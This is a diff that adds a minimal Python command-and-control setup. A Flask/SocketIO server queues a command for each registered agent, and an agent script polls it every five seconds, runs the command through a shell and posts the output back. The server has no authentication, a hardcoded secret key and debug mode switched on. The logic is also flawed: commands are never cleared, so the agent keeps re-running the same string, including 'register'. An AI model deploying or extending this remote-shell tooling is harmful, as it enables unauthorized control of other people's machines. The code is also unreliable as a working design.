@@ -1,0 +1,121 @@
+from flask import Flask, render_template, request, jsonify
+from flask_socketio import SocketIO, emit
+
+app = Flask(__name__)
+app.config['SECRET_KEY'] = 'secret!'
+socketio = SocketIO(app)
+
+# Store commands and outputs for each agent
+agents = {}
+
+# HTML page for command input and output
+@app.route('/', methods=['GET', 'POST'])
+def index():
+    return render_template('index.html')
+
+
+# Endpoint for agents to register and get commands
+@app.route('/agent', methods=['POST', 'GET'])
+def agent():
+    if request.method == 'POST':
+        # Register agent and store its command
+        agent_id = request.form.get('agent_id')
+        command = request.form.get('command')
+        app.logger.info(f"Received registration request: Agent ID: {agent_id}, Command: {command}")
+
+        if agent_id and command:
+            agents[agent_id] = {'command': command, 'output': ''}
+            app.logger.info(f"Agent registered successfully: {agent_id}")
+            return jsonify({'message': 'Agent registered successfully'}), 200
+        else:
+            app.logger.error("Agent registration failed: Missing agent_id or command")
+            return jsonify({'error': 'Agent registration failed: Missing agent_id or command'}), 400
+
+    elif request.method == 'GET':
+        # Get command for the specific agent
+        agent_id = request.args.get('agent_id')
+        if agent_id in agents:
+            app.logger.info(f"Command retrieved for agent: {agent_id}")
+            return jsonify(agents[agent_id]), 200
+        else:
+            app.logger.error(f"Agent not found: {agent_id}")
+            return jsonify({'error': 'Agent not found'}), 404
+
+# Endpoint for agents to send output back to the server
+@app.route('/output', methods=['POST'])
+def receive_output():
+    agent_id = request.form.get('agent_id')
+    output = request.form.get('output', '')
+    if agent_id in agents:
+        agents[agent_id]['output'] = output
+        socketio.emit('output_update', {'output': output})  # Emit socket event without broadcast argument
+        app.logger.info(f"Output received successfully for agent: {agent_id}")
+        return jsonify({'message': 'Output received successfully'}), 200
+    else:
+        app.logger.error(f"Agent not found while receiving output: {agent_id}")
+        return jsonify({'error': 'Agent not found while receiving output'}), 404
+
+if __name__ == '__main__':
+    socketio.run(app, debug=True, port=5001, use_reloader=False, allow_unsafe_werkzeug=True)
+
+
+##################################
+
+
+
+import requests
+import subprocess
+import time
+import uuid
+
+SERVER_URL = 'http://127.0.0.1:5001'
+AGENT_ID = str(uuid.uuid4())
+COMMAND_ENDPOINT = f'{SERVER_URL}/agent?agent_id={AGENT_ID}'
+OUTPUT_ENDPOINT = f'{SERVER_URL}/output'
+
+def execute_command(command):
+    try:
+        result = subprocess.run(
+            command,
+            shell=True,
+            check=True,
+            text=True,
+            capture_output=True
+        )
+        return result.stdout
+    except subprocess.CalledProcessError as e:
+        error_message = f"Error executing command: {e}\n"
+        if hasattr(e, 'stderr') and e.stderr is not None:
+            error_message += f"{e.stderr}\n"
+        return error_message
+    except Exception as e:
+        return f"Error executing command: {e}"
+
+def send_output(output):
+    try:
+        response = requests.post(OUTPUT_ENDPOINT, data={'agent_id': AGENT_ID, 'output': output})
+        response.raise_for_status()
+    except requests.exceptions.RequestException as e:
+        print(f"Request Error: {e}")
+
+# Register the agent
+try:
+    response = requests.post(COMMAND_ENDPOINT, data={'agent_id': AGENT_ID, 'command': 'register'})
+    response.raise_for_status()
+    print("Agent registered successfully")
+except requests.exceptions.RequestException as e:
+    print(f"Registration Error: {e}")
+
+# Main loop to continuously check for commands and execute them
+while True:
+    try:
+        response = requests.get(COMMAND_ENDPOINT)
+        if response.status_code == 200:
+            data = response.json()
+            command_to_execute = data.get('command', '')
+            if command_to_execute:
+                output = execute_command(command_to_execute)
+                send_output(output)
+    except requests.exceptions.RequestException as e:
+        print(f"Request Error: {e}")
+    time.sleep(5)
